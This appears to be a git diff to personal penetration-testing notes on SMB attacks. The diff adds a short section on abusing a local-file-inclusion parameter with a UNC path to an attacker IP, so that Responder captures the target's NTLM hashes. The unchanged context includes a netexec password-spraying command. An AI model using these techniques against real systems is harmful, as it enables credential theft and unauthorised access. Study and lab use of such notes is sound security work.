@@ -163,6 +163,22 @@ Or check one pass for wordlist of users
 nxc smb $target -u users.txt -p 'some_pass'
 ```
 
+Also it a little bit touches *smb* if target have website and open smb port with *LFI* vuln 
+
+```bash
+http://somesite.com/index.php?file=image
+```
+
+So `image` can be replaced as `smb share` and hash can be cathed
+
+Replace `image` 
+
+```bash
+http://somesite.com/index.php?file=\\10.10.10.10\Share
+```
+
+don't forgot to start `responder` in same network as target, replace `10.10.10.10` by your ip
+
 [[NTLM]]
 == NTLM Relay Attack
 
